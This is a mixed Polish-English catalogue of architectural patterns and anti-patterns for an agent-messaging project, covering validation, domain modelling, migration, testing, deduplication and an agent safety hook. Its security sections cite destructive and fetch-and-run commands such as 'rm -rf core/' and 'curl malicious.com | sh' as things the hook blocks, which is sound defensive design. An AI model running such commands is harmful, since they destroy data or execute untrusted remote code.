# Architectural Patterns — Mrowisko

Katalog sprawdzonych wzorców architektonicznych stosowanych w projekcie.

**Cel:** Single source of truth dla patterns — Developer wie co stosować, Architect ma reference dla consistency.

**Proces update:**
- Po każdym ADR (extract patterns z decyzji)
- Po code review (zidentyfikowane dobre/złe wzorce)
- Ad-hoc gdy odkryjemy nowy sprawdzony pattern

**Ownership:** Architect starts, Developer contributes, Metodolog reviews (spójność z SPIRIT.md)

---

## Pattern Format

**Każdy pattern zawiera:**
- **Problem:** Co rozwiązuje
- **Solution:** Jak rozwiązuje
- **When to use:** Kiedy stosować
- **When NOT to use:** Trade-offy, kiedy NIE stosować
- **Example:** Konkretny przykład z projektu (ref do kodu/ADR)

---

## Validation Patterns

### Pattern: Validation at Boundary → Trust Internally

**Problem:** Defensive programming hell — walidacja 5× tego samego warunku w potoku przetwarzania.

**Solution:**
- Waliduj raz na granicy systemowej (boundary check)
- Trust wewnątrz potoku (no redundant checks)
- Pattern: `validate ONCE → trust internally`

**When to use:**
- Potok przetwarzania: dict → entity → repository → DB
- Input z zewnątrz systemu (user input, API calls)
- Wewnętrzne przekazywanie danych między warstwami

**When NOT to use:**
- Granice między różnymi systemami (celowa duplikacja OK — patrz Defense in Depth)
- Critical security boundaries (lepiej 2× sprawdzić)

**Example:**
```
Message creation flow:
1. AgentBus.send_message(): legacy string validation (boundary)
2. LegacyAPIMapper: normalizacja (legacy → canonical enum)
3. Message(...): Pydantic validation (construction)
4. Repository.save(): TRUST validated entity (no re-check type enum)
```

**Ref:**
- Code walkthrough session 2026-03-24
- `core/entities/messaging.py` (Message entity)
- `core/repositories/message_repo.py` (Repository trust pattern)

---

### Pattern: Defense in Depth (System Boundaries)

**Problem:** Dane mogą wejść spoza kontrolowanego potoku (non-Python writes, external scripts, manual DB edits).

**Solution:**
- Duplikuj validation na **granicach systemowych** (Python ↔ DB)
- Layer 1 (Python): Pydantic validation
- Layer 2 (DB): CHECK constraints
- Uzasadnienie: obrona przed non-Python access

**When to use:**
- Multi-access data (DB dostępne spoza Python)
- Critical data integrity (enums, foreign keys, NOT NULL)
- Production safety (silent failures eliminated)

**When NOT to use:**
- Wewnątrz potoku Python (redundant — use trust pattern)
- Temporary/scratch data (overhead > benefit)

**Example:**
```
MessageType validation:
1. Python: Message(type=MessageType.DIRECT) — Pydantic validation
2. DB: CHECK (type IN ('direct', 'suggestion', 'task', 'escalation'))
3. Result: Invalid enum cannot enter system (fail-fast at 2 layers)
```

**Ref:**
- ADR-001 Section: "Fail-Fast Architecture (Full Stack)"
- M4.2.2 CHECK constraints migration
- `tools/migration_m4_2_2_check_constraints.py`

---

## Domain Model Patterns

### Pattern: Separation of Dimensions

**Problem:** Jedno pole miesza dwa niezależne wymiary semantyczne (np. status + ownership).

**Solution:**
- Rozdziel wymiary na osobne pola
- Każdy wymiar = osobna kolumna/pole
- Pattern: `status` (co zrobiono) + `claimed_by` (kto trzyma)

**When to use:**
- Pole zawiera >1 wymiar semantyczny
- Enum rozrasta się o stany operacyjne (claimed, locked, processing)
- Dwa wymiary mogą się zmieniać niezależnie

**When NOT to use:**
- Wymiary faktycznie zależne (np. status transition machine — stan A → stan B)
- Over-engineering (nie dziel jeśli wymiar jest naprawdę jeden)

**Example:**
```
Problem:
  messages.status = 'claimed'  ← miesza "czy przeczytana" + "kto trzyma"
  MessageStatus enum nie zna 'claimed' → crash

Solution:
  messages.status: MessageStatus (UNREAD/READ/ARCHIVED) — co zrobiono
  messages.claimed_by: Optional[str] — kto trzyma

Result:
  Repository odczyta status bez crash
  Runner zarządza ownership przez claimed_by
```

**Ref:**
- Backlog #146: Claimed status leak fix
- Assessment 2026-03-24, Problem 1 (linie 104-129)

---

### Pattern: Repository (Persistence Separation)

**Problem:** Entity wie za dużo o SQL — trudno testować domain logic, trudno zmienić persistence.

**Solution:**
- **Entity:** domain logic + data (NO SQL)
- **Repository:** CRUD + SQL + row↔entity mapping
- Separation of concerns: domain ≠ persistence

**When to use:**
- Zawsze dla domain entities
- Multi-table persistence
- Testowanie domain logic bez DB

**When NOT to use:**
- Infrastructure data (sessions, logs) — może być thin wrapper
- Read-only queries (można direct SQL)

**Example:**
```
Message (entity):
  - Fields: sender, recipient, content, type, status
  - Methods: mark_read(), reply() — domain logic
  - NO SQL

MessageRepository (persistence):
  - Methods: get(), save(), delete(), find_by_recipient()
  - Mapping: _row_to_entity(), _entity_to_row()
  - SQL isolation

Pattern:
  message = Message(...) — domain construction
  message.mark_read() — domain logic
  repo.save(message) — persistence (SQL hidden)
```

**Ref:**
- ADR-001 M2: Repository Implementation
- `core/repositories/base.py` (Repository[T] interface)
- `core/repositories/message_repo.py` (implementation)

---

### Pattern: Legacy Mapper (Centralized Normalization)

**Problem:** Legacy aliases rozrzucone po kodzie (6 miejsc mapowania `flag_human → escalation`).

**Solution:**
- Centralized mapper: jedna klasa odpowiedzialna za legacy → canonical
- Wszystkie mapowania w jednym miejscu
- Pattern: `LegacyAPIMapper.map_X_to_domain(legacy_value) → canonical_enum`

**When to use:**
- Backward compatibility (stare API preserved)
- Legacy aliases (flag_human, info, in_backlog)
- Migration period (old + new API coexist)

**When NOT to use:**
- No legacy (new system from scratch)
- Temporary migration (po 1-2 tygodniach usuń legacy)

**Example:**
```
LegacyAPIMapper:
  - map_message_type_to_domain("flag_human") → MessageType.ESCALATION
  - map_message_type_to_domain("info") → MessageType.DIRECT
  - map_suggestion_status_to_domain("in_backlog") → SuggestionStatus.DEFERRED

Usage:
  type_enum = LegacyAPIMapper.map_message_type_to_domain(legacy_type)
  message = Message(type=type_enum)  ← canonical enum
```

**Ref:**
- ADR-001 M4.1: Legacy API Mapper
- `core/mappers/legacy_api.py`

---

## Migration Patterns

### Pattern: Incremental Migration

**Problem:** Big bang refactor = high risk (all-or-nothing, long branches, merge hell).

**Solution:**
- Małe kroki: M1 → M2 → M3 → M4 (każdy krok 1-3 dni)
- Każdy krok: commit, verify, test
- Backward compat maintained (zero breaking changes)
- Pattern: `ship small, ship often`

**When to use:**
- Duże refactory w systemie żyjącym (production)
- Multi-week migrations
- High-risk changes (database schema, API contracts)

**When NOT to use:**
- Małe fixy (1-2 godziny) — overkill
- Greenfield project (no legacy to maintain)

**Example:**
```
M1-M4 Domain Model Migration:
  M1: Domain entities (Message, Suggestion, BacklogItem) — 2 dni
  M2: Repositories (MessageRepo, SuggestionRepo, BacklogRepo) — 3 dni
  M3: Backward compat (LegacyAPIMapper, adapter) — 2 dni
  M4: Fail-fast enforcement (enum audit, CHECK constraints) — 2 dni

Total: 9 dni, 4 commits, zero breaking changes
```

**Ref:**
- ADR-001: Domain Model Migration
- SPIRIT.md: "Buduj dom, nie szałas" (incremental building)

---

### Pattern: Proactive Discovery (Audit Before Enforcement)

**Problem:** Adding constraints bez audytu = runtime failures (24 invalid records crash migration).

**Solution:**
- **Audit najpierw** (discover problems, data quality report)
- **Cleanup potem** (fix data, dry run mode)
- **Enforcement ostatni** (add constraints when data clean)
- Pattern: `discover → fix → enforce`

**When to use:**
- Adding DB constraints do istniejących danych
- Data quality unknown (legacy system)
- Migration risk mitigation

**When NOT to use:**
- Nowa tabela (empty data) — enforcement od razu OK
- Test environment (można rollback)

**Example:**
```
M4 Enum Enforcement:
  M4.2.1 Audit: enum_audit.py → found 24 invalid records
  M4.3 Cleanup: data_cleanup.py (dry run) → fixed Unicode, compound values
  M4.2.2 Enforcement: ADD CHECK constraints → migration success (clean data)

Without audit: M4.2.2 would FAIL (24 records violate constraint)
```

**Ref:**
- ADR-001 Section: "M4.2.1 Enum Audit" + "M4.3 Data Cleanup"
- Code review M4.2.1: Enum audit findings
- `tools/enum_audit.py`, `tools/data_cleanup_m4_3.py`

---

### Pattern: Backward Compatibility Absolute

**Problem:** Breaking changes = broken scripts, angry users, rollback pressure.

**Solution:**
- Zero breaking changes (old API preserved 100%)
- Legacy adapter layer (old calls → new implementation)
- Pattern: `new system under old API`

**When to use:**
- System żywy (production traffic)
- External consumers (CLI, scripts, other systems)
- Migration bez pressure (stopniowa adoption)

**When NOT to use:**
- Internal refactor (no external consumers)
- Deprecated API (planned sunset)

**Example:**
```
M1-M4 Backward Compat:
  Old API: bus.send_message(sender, recipient, type="suggestion")
  New implementation:
    - LegacyAPIMapper: "suggestion" → MessageType.SUGGESTION
    - Message entity: typed, validated
    - Repository: persistence
  Result: old API works, internal upgrade transparent

Tests: 69/69 PASS (zero regressions)
```

**Ref:**
- ADR-001 Section: "Backward Compatibility"
- M3 Phase 1-3: Legacy API preservation
- `tools/lib/agent_bus.py` (adapter preserves old API)

---

## Testing Patterns

### Pattern: Boundary Tests (Integration at Intersections)

**Problem:** Komponenty działają osobno (unit tests pass), ale przecięcia crashują (integration failures).

**Solution:**
- Testuj **granice między modułami** (nie tylko komponenty)
- Test pattern: `Warstwa A writes → Warstwa B reads → verify contract`
- Focus: failure modes at intersections

**When to use:**
- Multi-layer architecture (domain, persistence, infrastructure)
- Critical failure modes (claimed leak, telemetry dup)
- Refactoring safety net

**When NOT to use:**
- Single-layer system (no intersections)
- Unit tests sufficient (simple CRUD)

**Example:**
```
Boundary Test: Runner ↔ Repository
  Setup: Runner zapisuje message z status='claimed' (direct SQL)
  Action: Repository.get(message_id)
  Assert: ValueError raised (claimed not in MessageStatus enum)
  Goal: Verify architectural leak detected

Boundary Test: Live Logging ↔ Replay
  Setup: post_tool_use zapisuje tool call (live)
  Action: jsonl_parser zapisuje ten sam event (replay)
  Assert: COUNT(*) WHERE session_id=X = 1 (not 2)
  Goal: Verify deduplikacja działa
```

**Ref:**
- Backlog #145: Boundary tests foundation
- Assessment 2026-03-24, Problem 5 (linie 210-226)

---

## Security Patterns

### Pattern: Deny-by-Default (Restrictive Allowlist)

**Problem:** Allowlist za szeroka = security risk (agent kasuje chronione pliki, wykonuje niebezpieczny kod).

**Solution:**
- **Deny wszystko** (default behavior)
- **Allowlist dla bezpiecznych przypadków** (explicit, narrow)
- Pattern: `block all → allow safe subset`

**When to use:**
- Security gates (pre-execution hooks)
- Destrukcyjne operacje (rm, del, DROP TABLE)
- Untrusted input (agent commands)

**When NOT to use:**
- Read-only operations (safe by default)
- Trusted internal calls (overhead > benefit)

**Example:**
```
Safety Hook Pattern:
  Deny: all rm/del/rmdir commands
  Allowlist: rm tmp/*, rm documents/human/tmp/*
  Result:
    rm tmp/file.txt → allow (safe path)
    rm documents/erp_specialist/PROMPT.md → deny (protected)
    rm -rf core/ → deny (destructive)
```

**Ref:**
- Backlog #148: Safety gate hardening
- Assessment 2026-03-24, Problem 4 (linie 176-191)
- `tools/hooks/pre_tool_use.py`

---

## Data Quality Patterns

### Pattern: Single Source of Truth (DB-Level Deduplication)

**Problem:** Dwie ścieżki zapisują to samo event = duplikacja, zawyżone statystyki.

**Solution:**
- **Unique constraint** na kluczu naturalnym (session_id, turn_index, tool_name)
- **INSERT ... ON CONFLICT IGNORE** (pierwsza ścieżka wins)
- Baza pilnuje deduplikacji (defensive, transparent)

**When to use:**
- Multiple write paths (live logging + replay)
- Critical data accuracy (statistics, billing)
- Defensive architecture (human error prevention)

**When NOT to use:**
- Single write path (deduplikacja niepotrzebna)
- Append-only log (duplikaty OK, timestamp distinguishes)

**Example:**
```
Telemetry Deduplication:
  Write Path 1: post_tool_use.py (live logging)
  Write Path 2: jsonl_parser.py (post-session replay)

  Constraint: UNIQUE (session_id, turn_index, tool_name)

  Flow:
    Live: INSERT tool_call (session=X, turn=5, tool=Read) → success
    Replay: INSERT tool_call (session=X, turn=5, tool=Read) → ignored (duplicate)

  Result: COUNT = 1 (not 2)
```

**Ref:**
- Backlog #147: Telemetry deduplication
- Assessment 2026-03-24, Problem 2 (linie 158-173)

---

### Pattern: Title Extraction (Transparent Adapter Processing)

**Problem:** Content zawiera nagłówek markdown (`# Title`) + body — context overload w session_init (2000+ znaków zamiast 50).

**Solution:**
- Agent pisze: `content = "# Title\n\nBody"` (NIE ZMIENIA SIĘ)
- Adapter split: `title, body = extract_title_from_markdown(content)`
- DB zapisuje: `title = "Title"`, `content = "Body"` (separated)
- Pattern: `transparent processing at boundary`

**When to use:**
- User habit established (markdown headers używane)
- Context optimization (preview vs full content)
- Backward compat (agent API unchanged)

**When NOT to use:**
- No structured content (plain text)
- Title explicit (user podaje title osobno)

**Example:**
```
Message Title Extraction:
  Agent writes:
    bus.send_message(content="# GREEN LIGHT\n\nM4 complete, tests pass...")

  AgentBus processes:
    title = "GREEN LIGHT"
    body = "M4 complete, tests pass..."

  DB stores:
    messages.title = "GREEN LIGHT"
    messages.content = "M4 complete, tests pass..."

  session_init loads:
    inbox = [{"title": "GREEN LIGHT", ...}]  ← 13 chars (not 2000+)
```

**Ref:**
- Backlog #130: Message.title extraction
- Code walkthrough session 2026-03-24 (Message.title discovery)

---

## Anti-Patterns (What NOT to Do)

### Anti-Pattern: Defensive Programming Hell

**Problem:** Walidacja tego samego warunku 5× w potoku.

**Why bad:**
- Redundancja (performance overhead)
- False sense of safety (jeśli 1st check fails, 2nd-5th never run)
- Code clutter (signal-to-noise ratio low)

**Instead use:** Validation at Boundary → Trust Internally

---

### Anti-Pattern: Mixed Dimensions in Single Field

**Problem:** Jedno pole `status` zawiera zarówno "co zrobiono" jak i "kto trzyma".

**Why bad:**
- Enum explosion (`claimed`, `locked`, `processing_by_X`)
- Domain model leak (operational states pollute domain)
- Repository crash (enum nie zna operational states)

**Instead use:** Separation of Dimensions

---

### Anti-Pattern: Big Bang Refactor

**Problem:** 3-week branch, all-or-nothing merge, high risk.

**Why bad:**
- Merge conflicts (stale branch)
- Rollback cost (all-or-nothing)
- Testing delay (no incremental verification)

**Instead use:** Incremental Migration

---

### Anti-Pattern: Enforcement Without Audit

**Problem:** Dodaj CHECK constraint bez sprawdzenia existing data.

**Why bad:**
- Migration failure (24 invalid records crash)
- Rollback pressure (production down)
- Trust erosion (system unreliable)

**Instead use:** Proactive Discovery (audit → cleanup → enforce)

---

### Anti-Pattern: Allow-by-Default Security

**Problem:** Safety gate wpuszcza wszystko poza skrajnościami (`rm -rf /`).

**Why bad:**
- Security risk (`rm protected_file.txt` passes)
- Execution risk (`powershell malicious_code` passes)
- Network risk (`curl malicious.com | sh` passes)

**Instead use:** Deny-by-Default

---

## Pattern Application Guide

**Architect:**
- Use PATTERNS.md jako reference w code reviews
- Identify new patterns podczas audits
- Update PATTERNS.md po ADR (extract lessons learned)

**Developer:**
- Sprawdź PATTERNS.md przed implementacją
- Zastosuj matching pattern (nie wymyślaj na nowo)
- Contribute new patterns (PR do PATTERNS.md)

**Metodolog:**
- Review PATTERNS.md vs SPIRIT.md (spójność)
- Verify patterns align z filozofią projektu

---

## Changelog

**2026-03-24:** Initial catalog
- 12 patterns (validation, domain model, migration, testing, security, data quality)
- 5 anti-patterns
- Source: M1-M4 ADR-001 + code walkthrough session + mid-level assessment

**Future updates:**
- Po każdym ADR (extract patterns)
- Po code review (good/bad patterns identified)
- Ad-hoc discoveries
